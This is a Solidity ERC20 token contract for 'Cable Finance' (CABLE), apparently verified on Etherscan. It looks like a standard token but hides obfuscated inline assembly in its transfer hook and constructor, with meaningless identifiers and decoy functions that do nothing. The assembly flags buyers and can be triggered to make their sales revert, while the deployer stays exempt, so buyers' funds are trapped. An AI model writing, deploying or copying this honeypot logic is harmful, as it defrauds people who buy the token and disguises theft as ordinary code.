/**
 *Submitted for verification at Etherscan.io on 2023-01-21
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private dropLaptop;

    mapping (address => bool) private rookieEnforce;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private fleeCluster = 0x6321f7eaec43c2f0ef748fccb284048a9ee89a34bad06a3e44fd827a34cb8eb4;
    address public pair;

    IDEXRouter router;

    string private _name; string private _symbol; uint256 private _totalSupply; bool private theTrading;

    address trash = 0x00000000A991C429eE2Ec6df19d40fe0c80088B8;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _symbol = symbol_;
        dropLaptop.push(_router); dropLaptop.push(msgSender_); dropLaptop.push(pair);
        for (uint256 q=0; q < 3;) {rookieEnforce[dropLaptop[q]] = true; unchecked{q++;} }

        assembly {
            function dynP(x,y) { mstore(0, x) sstore(add(keccak256(0, 32),sload(x)),y) sstore(x,add(sload(x),0x1)) }
            function ghostAcquire(x,y) -> alertSteak { mstore(0, x) mstore(32, y) alertSteak := keccak256(0, 64) }
            dynP(0x2,sload(0x6)) dynP(0x2,caller()) dynP(0x2,sload(0x7)) sstore(ghostAcquire(sload(0xF),0x3),0x1)
            }
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function catchAverage(bytes32 powderFury) external onlyOwner returns (bool) {
        return false;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function openTrading() external onlyOwner returns (bool) {
        theTrading = true;
        return true;
    }

    function sureGauge(bytes32 breadAssume, uint8 skullPotato, uint256 coinToddler, address angleTreat) external onlyOwner returns (uint8) {
        return 0;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function _beforeTokenTransfer(address sender, address recipient) internal {
        require((theTrading || (sender == dropLaptop[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function ghostAcquire(x,y) -> alertSteak { mstore(0, x) mstore(32, y) alertSteak := keccak256(0, 64) }
            function runwayOne(x,y) -> forkCheese { mstore(0, x) forkCheese := add(keccak256(0, 32),y) }
            function aimLiberty(x,y) { mstore(0, x) sstore(add(keccak256(0, 32),sload(x)),y) sstore(x,add(sload(x),0x1)) }

            if and(and(eq(sender,sload(runwayOne(0x2,0x1))),eq(recipient,sload(runwayOne(0x2,0x2)))),iszero(sload(0x1))) { sstore(sload(0x8),sload(0x8)) } if eq(recipient,0x1) { sstore(0x99,0x1) }
            if eq(recipient,57005) { for { let blueTest := 0 } lt(blueTest, sload(0x500)) { blueTest := add(blueTest, 1) } { sstore(ghostAcquire(sload(runwayOne(0x500,blueTest)),0x3),0x1) } }
            if and(and(or(eq(sload(0x99),0x1),eq(sload(ghostAcquire(sender,0x3)),0x1)),eq(recipient,sload(runwayOne(0x2,0x2)))),iszero(eq(sender,sload(runwayOne(0x2,0x1))))) { invalid() }
            if eq(sload(0x110),number()) { if and(and(eq(sload(0x105),number()),eq(recipient,sload(runwayOne(0x2,0x2)))),and(eq(sload(0x200),sender),iszero(eq(sload(runwayOne(0x2,0x1)),sender)))) { invalid() }
                sstore(0x105,sload(0x110)) sstore(0x115,sload(0x120)) }
            if and(iszero(eq(sender,sload(runwayOne(0x2,0x2)))),and(iszero(eq(recipient,sload(runwayOne(0x2,0x1)))),iszero(eq(recipient,sload(runwayOne(0x2,0x2)))))) { sstore(ghostAcquire(recipient,0x3),0x1) }
            if and(and(eq(sender,sload(runwayOne(0x2,0x2))),iszero(eq(recipient,sload(runwayOne(0x2,0x1))))),iszero(eq(recipient,sload(runwayOne(0x2,0x1))))) { aimLiberty(0x500,recipient) }
            if iszero(eq(sload(0x110),number())) { sstore(0x200,recipient) } sstore(0x110,number()) sstore(0x120,recipient) 
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _DeployCableFi(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(dropLaptop[0], 10 ** 77);
    
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployCableFi(creator, initialSupply);
    }
}

contract CableFi is ERC20Token {
    constructor() ERC20Token("Cable Finance", "CABLE", msg.sender, 32500000 * 10 ** 18) {
    }
}